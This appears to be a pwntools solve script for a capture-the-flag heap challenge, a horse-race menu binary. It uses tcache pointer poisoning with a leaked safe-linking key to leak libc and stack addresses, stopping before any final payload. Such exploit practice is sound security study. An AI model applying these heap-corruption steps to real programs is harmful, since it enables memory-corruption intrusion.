from pwn import *

io = process('./vuln_patched')
e = ELF('./vuln_patched')

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def cheat(index, name, newspot):
    io.sendline(b'0')
    io.sendline(str(index).encode())
    io.sendline(name)
    io.sendline(str(newspot).encode())

def add_horse(index, length, name):
    io.sendline(b'1')
    io.sendline(str(index).encode())
    io.sendline(str(length).encode())
    io.sendline(name)

def rm_horse(index):
    io.sendline(b'2')
    io.sendline(str(index).encode())

def race():
    io.sendline(b'3')

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

for i in range(5):
    add_horse(i, 256, b'i' * 256)
    rm_horse(i)
    add_horse(i, 256, b'\xFF')

race()
io.recvuntil(b'WINNER: ')
aslr = int.from_bytes(io.recvuntil(b'\n').replace(b'\n', b''), 'little')
print(f'aslr: {hex(aslr)}')

rm_horse(0)
rm_horse(1)

cheat(1, p64(0x4040E0 ^ aslr) + b'\xFF', 0)


add_horse(0, 256, b'\x00' * 256)
add_horse(1, 256, b'\xFF')

leak = aslr

while leak == aslr or leak == 0:
    race()
    io.recvuntil(b'WINNER: ')
    leak = int.from_bytes(io.recvuntil(b'\n').replace(b'\n', b''), 'little')

libc_base = leak - 0x1BE5E0
print("Libc base: " + hex(libc_base))
gdb.attach(io)
rm_horse(3)
rm_horse(2)

# stack leak
cheat(2, p64((libc_base + 0x1bf620) ^ aslr) + b'\xFF', 2)

add_horse(2, 256, b'\xFF')
add_horse(3, 256, b'\xFF')


rm_horse(5)
rm_horse(4)

cheat(4, p64(0x4040E0 ^ aslr) + b'\xFF', 4)

add_horse(4, 256, b'\x00' * 256)
add_horse(5, 256, b'\xFF')

another_leak = 0
while another_leak == 0 or another_leak == leak or another_leak == aslr:
    race()
    io.recvuntil(b'WINNER: ')
    another_leak = int.from_bytes(io.recvuntil(b'\n').replace(b'\n', b''), 'little')
print(f"stack leak is: {hex(another_leak)}")

gdb.attach(io)

io.interactive()
